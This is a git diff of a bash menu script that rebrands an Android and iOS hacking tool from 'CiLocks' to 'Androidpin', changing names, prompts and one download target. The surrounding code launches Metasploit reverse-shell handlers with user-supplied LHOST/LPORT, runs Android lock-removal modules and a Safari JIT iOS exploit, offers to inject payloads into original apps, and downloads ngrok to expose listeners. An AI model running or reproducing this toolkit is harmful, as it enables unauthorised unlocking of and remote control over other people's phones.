@@ -92,7 +92,7 @@ if [[ $select == 1 ]]; then
   rm -f "${path}/data/config" >/dev/null 2>&1
   rm -f "${path}/data/os" >/dev/null 2>&1
   # update new release
-  wget https://raw.githubusercontent.com/itechsking/Androidpin/main/cilocks -O "${path}/cilocks" >/dev/null 2>&1
+  wget https://raw.githubusercontent.com/itechsking/Androidpin/main/cilocks -O "${path}/Androidpin" >/dev/null 2>&1
   wget https://raw.githubusercontent.com/itechsking/Androidpin/main/data/config -O "${path}/data/config" >/dev/null 2>&1
   wget https://raw.githubusercontent.com/itechsking/Androidpin/data/os -O "${path}/data/os" >/dev/null 2>&1
   # give permission
@@ -100,7 +100,7 @@ if [[ $select == 1 ]]; then
   chmod +x "${path}/data/config" >/dev/null 2>&1
   chmod +x "${path}/data/os" >/dev/null 2>&1
   echo "Done!"
-  echo "Restart Cilocks..."
+  echo "Restart Androidpin..."
   sleep 3
   files
 
@@ -241,7 +241,7 @@ elif [[ $select == 7 ]]; then
 99.Menu
 ${n}  "
 fpath="backup"
-read -p "senpai@tegalsec:~# " select
+read -p "itechsking@:~# " select
   if [[ $select == 1 ]]; then
       echo "Opening Shell..."
       sleep 3
@@ -299,7 +299,7 @@ elif [[ $select == 8 ]]; then
   1.Fastboot
   2.Recovery
   ${n}"
-  read -p "senpai@tegalsec:~# " select
+  read -p "itechsking@:~# " select
   if [[ $select == 1 ]]; then
     adb reboot bootloader
     deviceConnected=konek
@@ -343,7 +343,7 @@ echo -e "${lh}
 4.Inject Payload In Original Application
 99.Menu
 ${n}"
-read -p "senpai@tegalsec:~# " select
+read -p "iechsking@:~# " select
 if [[ $select == 1 ]]; then
   read -p "Enter Ur Application: " app
   read -p "Run Application {Y/N}: " run
@@ -388,34 +388,34 @@ elif [[ $select == 3 ]]; then
   3.Remove Lock {Root}
   4.Safari Jit {iOS < 7.1.2}
   ${n}"
-  read -p "senpai@tegalsec:~# " select
+  read -p "itechsking@:~# " select
   if [[ $select == 1 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use exploit/multi/handler'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   elif [[ $select == 2 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use post/android/manage/remove_lock'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   elif [[ $select == 3 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use post/android/manage/remove_lock_root'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   elif [[ $select == 4 ]]; then
     read -p "LHOST: " host
     read -p "LPORT: " port
     msfconsole=msfconsole
     exploit='use exploit/apple_ios/browser/safari_jit'
-    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
+    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
   fi
 
 elif [[ $select == 4 ]]; then
@@ -460,7 +460,7 @@ elif [[ $select == 12 ]]; then
   # 2.
   # 99.Menu
   # ${n}"
-  # read -p "senpai@tegalsec:~# " select
+  # read -p "itechsking@:~# " select
   # if [[ $select == 1 ]]; then
   manu=$(adb shell getprop ro.product.manufacturer)
   model=$(adb shell getprop ro.product.model)
@@ -721,7 +721,7 @@ elif [[ $select == 13 ]]; then
   arch=$(uname -a | grep -o 'arm' | head -n1)
   arch2=$(uname -a | grep -o 'Android' | head -n1)
   if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-  command -v wget > /dev/null 2>&1 || { echo >&2 "${m}Cilocks require wget but it's not installed. Install it. Aborting.${n}"; exit 1; }
+  command -v wget > /dev/null 2>&1 || { echo >&2 "${m}Androidpin require wget but it's not installed. Install it. Aborting.${n}"; exit 1; }
   wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
   if [[ -e ngrok-stable-linux-arm.zip ]]; then
@@ -738,7 +738,7 @@ elif [[ $select == 13 ]]; then
   else
   wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
   if [[ -e ngrok-stable-linux-386.zip ]]; then
-  command -v unzip > /dev/null 2>&1 || { echo >&2 "${m}Cilocks require unzip but it's not installed. Install it. Aborting.${n}"; exit 1; }
+  command -v unzip > /dev/null 2>&1 || { echo >&2 "${m}Androidpin require unzip but it's not installed. Install it. Aborting.${n}"; exit 1; }
   unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
   chmod +x ngrok
   rm -rf ngrok-stable-linux-386.zip
@@ -821,7 +821,7 @@ elif [[ $select == 14 ]]; then
   dependencies() {
 
 
-  command -v php > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require php but it's not installed. Install it. Aborting.${n}"; exit 1; }
+  command -v php > /dev/null 2>&1 || { echo >&2 "${lh}Androidpin require php but it's not installed. Install it. Aborting.${n}"; exit 1; }
 
 
 
@@ -880,8 +880,8 @@ elif [[ $select == 14 ]]; then
   if [[ -e ngrok ]]; then
   echo ""
   else
-  command -v unzip > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require unzip but it's not installed. Install it. Aborting.${lh}"; exit 1; }
-  command -v wget > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require wget but it's not installed. Install it. Aborting.${lh}"; exit 1; }
+  command -v unzip > /dev/null 2>&1 || { echo >&2 "${lh}Androidpin require unzip but it's not installed. Install it. Aborting.${lh}"; exit 1; }
+  command -v wget > /dev/null 2>&1 || { echo >&2 "${lh}Androidpin require wget but it's not installed. Install it. Aborting.${lh}"; exit 1; }
   echo -e "${m} Downloading Ngrok...${n}\n"
   arch=$(uname -a | grep -o 'arm' | head -n1)
   arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -946,7 +946,7 @@ elif [[ $select == 15 ]]; then
   echo -e "${lh}
   1.Scanning APK Without Authentication
   ${n}"
-  read -p "senpai@tegalsec:~# " select
+  read -p "itechsking@:~# " select
   if [[ $select == 1 ]]; then
 
     milf() {
